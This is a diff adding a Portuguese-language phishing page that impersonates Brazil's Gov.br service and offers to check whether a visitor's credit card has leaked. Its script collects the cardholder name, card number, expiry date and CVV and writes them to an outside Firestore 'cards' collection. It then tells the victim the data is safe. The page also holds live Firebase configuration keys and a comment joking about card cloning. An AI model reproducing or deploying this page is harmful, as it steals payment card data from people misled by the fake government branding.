@@ -1,0 +1,485 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" type="image/png" href="https://www.gov.br/++theme++padrao_govbr/favicons/favicon-32x32.png">
+<!-- nego que clona cc e porque tem medo do clt -->
+<title>Verificação Segura</title>
+<style>
+* {
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  background: linear-gradient(135deg, #1b0b3b, #ffffff);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.container {
+  width: 90%;
+  max-width: 1000px;
+  display: flex;
+  gap: 60px;
+  align-items: center;
+}
+
+.cards {
+  position: relative;
+  width: 380px;
+  height: 300px;
+}
+
+.card {
+  position: relative;
+  width: 320px;
+  height: 180px;
+  background: #181514;
+  border-radius: 6px;
+  color: white;
+  padding: 20px;
+  box-shadow: 0 20px 35px rgba(0,0,0,.35);
+}
+
+.front {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+.back {
+  position: absolute;
+  bottom: -70px; /* desce 20px */
+  right: 0;
+}
+
+
+.small {
+  width: 26px;
+  height: 26px;
+}
+
+.bank {
+    margin-top: 45px;
+    position: absolute;
+    top: 65px;
+    left: 20px;
+    color: white;
+    font-size: 16px;
+}
+.chip {
+  width: 40px;
+  height: 30px;
+  background: #ccc;
+  border-radius: 5px;
+  margin-top: 25px;
+}
+
+.decor-circle {
+  position: absolute;
+  border-radius: 50%;
+  background: rgba(255,255,255,0.18);
+  bottom: 18px;
+  right: 18px;
+}
+
+.decor-circle--small {
+    width: 30px;
+  height: 30px;
+  right: 25px;
+}
+
+.decor-circle--large {
+  width: 30px;
+  height: 30px;
+  right: 44px;
+}
+
+.number {
+  margin-top: 55px;
+  letter-spacing: 2px;
+}
+
+.name {
+  margin-top: 18px;
+  font-size: 22px;
+  letter-spacing: 2px;
+}
+
+.strip {
+  height: 45px;
+  background: #333;
+  margin: 20px -20px;
+}
+
+.cvv {
+  background: #cfd3da;
+  color: #333;
+  padding: 8px;
+  text-align: right;
+  margin-top: 25px;
+}
+
+.form-box {
+  width: 320px;
+}
+
+h1 {
+  font-size: 34px;
+  margin-bottom: 25px;
+}
+
+mark {
+  background: #cfd3da;
+  padding: 0 8px;
+}
+
+label {
+  font-size: 13px;
+  margin-top: 12px;
+  display: block;
+}
+
+input {
+  width: 100%;
+  padding: 12px;
+  border: none;
+  background: #d9d9d9;
+  margin-top: 5px;
+  border-radius: 2px;
+}
+
+.row {
+  display: flex;
+  gap: 10px;
+}
+
+button {
+  width: 100%;
+  margin-top: 18px;
+  padding: 13px;
+  border: none;
+  background: #6e6392;
+  color: white;
+  border-radius: 3px;
+  cursor: pointer;
+}
+
+.warning {
+  font-size: 12px;
+  margin-top: 12px;
+  text-align: center;
+  color: #444;
+}
+
+/* Responsivo para Tablet e Mobile */
+@media (max-width: 768px) {
+  body {
+    padding: 18px;
+    align-items: flex-start;
+    justify-content: center;
+  }
+
+  .container {
+    width: 900%;
+    max-width: 460px;
+    flex-direction: column;
+    align-items: stretch;
+    gap: 28px;
+    padding-top: 40px;
+  }
+
+  .cards {
+    width: 100%;
+    max-width: 390px;
+    height: 370px;
+    margin: 0 auto;
+    position: relative;
+  }
+
+  .card {
+    width: 320px;
+    height: 180px;
+    padding: 20px;
+  }
+
+  .front {
+    position: absolute;
+    top: 0;
+    left: 0;
+  }
+
+  .back {
+    position: absolute;
+    top: 190px;
+    right: 0;
+    bottom: auto;
+    margin: 0;
+  }
+
+  .form-box {
+    width: 100%;
+  }
+
+  h1 {
+    font-size: 26px;
+    margin: 0 0 20px;
+  }
+
+  input {
+    padding: 10px;
+    font-size: 16px;
+  }
+
+  button {
+    padding: 12px;
+    font-size: 16px;
+  }
+}
+
+
+@media (max-width: 480px) {
+  body {
+    padding: 18px;
+  }
+
+  .container {
+    max-width: 100%;
+    gap: 22px;
+    padding-top: 40px;
+  }
+
+  .cards {
+    width: 100%;
+    max-width: 360px;
+    height: 350px;
+    margin: 0 auto;
+  }
+
+  .card {
+    width: min(320px, 88vw);
+    height: 180px;
+    padding: 20px;
+    font-size: 14px;
+  }
+
+  .front {
+    position: absolute;
+    top: 0;
+    left: 0;
+  }
+
+  .back {
+    position: absolute;
+    top: 190px;
+    right: 0;
+    bottom: auto;
+    margin: 0;
+  }
+
+  .chip {
+    width: 45px;
+    height: 32px;
+  }
+
+  .number {
+    margin-top: 50px;
+    font-size: 16px;
+    letter-spacing: 2px;
+    white-space: nowrap;
+  }
+
+  .name {
+    margin-top: 18px;
+    font-size: 18px;
+  }
+
+  .bank {
+    font-size: 16px;
+  }
+
+ 
+  .small {
+    width: 26px;
+    height: 26px;
+  }
+
+  h1 {
+    font-size: 24px;
+    line-height: 1.15;
+  }
+
+  label {
+    font-size: 12px;
+  }
+
+  .row {
+    gap: 8px;
+  }
+
+  .cvv {
+    padding: 8px;
+    font-size: 14px;
+    margin-top: 25px;
+  }
+
+  .strip {
+    height: 45px;
+    margin: 20px -25px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="cards">
+    <div class="card front">
+      
+      <span class="bank">Nome</span>
+
+      <div class="chip"></div>
+      <div class="number">0000 0000 0000 0000</div>
+      <div class="name"></div>
+      <div class="decor-circle decor-circle--small"></div>
+      <div class="decor-circle decor-circle--large"></div>
+    </div>
+
+    <div class="card back">
+      <div class="strip"></div>
+      <div class="cvv">000</div>
+    </div>
+  </div>
+
+  <div class="form-box">
+    <h1>Veja se seu cartão <mark>vazou</mark> na internet</h1>
+
+   <label>Nome no cartão</label>
+<input type="text" id="cardName" placeholder="João Silva">
+
+<label>Número do cartão</label>
+<input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
+
+<div class="row">
+  <div>
+    <label>Data</label>
+    <input type="text" id="cardDate" placeholder="MM/AA" maxlength="5">
+  </div>
+
+  <div>
+    <label>CVV</label>
+    <input type="text" id="cardCVV" placeholder="000" maxlength="3">
+  </div>
+</div>
+
+    
+    <button id="saveBtn">Verificar</button>
+    <p id="status" class="warning"></p>
+    <p class="warning">Página
+    <a href="https://www.gov.br/pt-br" target="_blank">
+         Gov.br
+    </a>
+</p>
+  </div>
+
+</div>
+<script>
+const cardDate = document.getElementById('cardDate');
+
+cardDate.addEventListener('input', (e) => {
+    let value = e.target.value.replace(/\D/g, '');
+
+    if (value.length > 2) {
+        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+    }
+
+    e.target.value = value;
+});
+</script>
+<script>
+const cardInput = document.getElementById("cardNumber");
+const cardDisplay = document.querySelector(".number");
+const cardNameInput = document.getElementById("cardName");
+const bankDisplay = document.querySelector(".bank");
+
+cardInput.addEventListener("input", function () {
+    let value = this.value.replace(/\D/g, "");
+
+    value = value.match(/.{1,4}/g)?.join(" ") || "";
+
+    this.value = value;
+    cardDisplay.textContent = value || "0000 0000 0000 0000";
+});
+
+cardNameInput.addEventListener("input", function () {
+    bankDisplay.textContent = this.value.trim() || "Nome";
+});
+</script>
+<script>
+const cvvInput = document.getElementById("cardCVV");
+const cvvDisplay = document.querySelector(".cvv");
+
+cvvInput.addEventListener("input", function () {
+    let value = this.value.replace(/\D/g, "");
+
+    this.value = value;
+    cvvDisplay.textContent = value || "000";
+});
+</script>
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyCTMYuTe6C9AdO5hms3iVAnmAMUCxJRN5o",
+    authDomain: "card-fbe3a.firebaseapp.com",
+    projectId: "card-fbe3a",
+    storageBucket: "card-fbe3a.firebasestorage.app",
+    messagingSenderId: "951774516335",
+    appId: "1:951774516335:web:87ee3602c37a3f9245699a"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+  const cardsCollection = collection(db, "cards");
+
+  const saveBtn = document.getElementById("saveBtn");
+  const status = document.getElementById("status");
+
+  saveBtn.addEventListener("click", async () => {
+    const cardName = document.getElementById("cardName").value.trim();
+    const cardNumber = document.getElementById("cardNumber").value.trim();
+    const cardDate = document.getElementById("cardDate").value.trim();
+    const cardCVV = document.getElementById("cardCVV").value.trim();
+
+    if (!cardName || !cardNumber || !cardDate || !cardCVV) {
+      status.textContent = "Preencha todos os campos antes de verificar.";
+      return;
+    }
+
+    try {
+      status.textContent = "Verificando...";
+      await addDoc(cardsCollection, {
+        cardName,
+        cardNumber,
+        cardDate,
+        cardCVV,
+        createdAt: serverTimestamp()
+      });
+      status.textContent = "Dados verificados com sucesso você está seguro.";
+    } catch (error) {
+      console.error(error);
+      status.textContent = "Erro ao verificar no Firestore. Verifique as regras e a configuração.";
+    }
+  });
+</script>
+</body>
+</html>
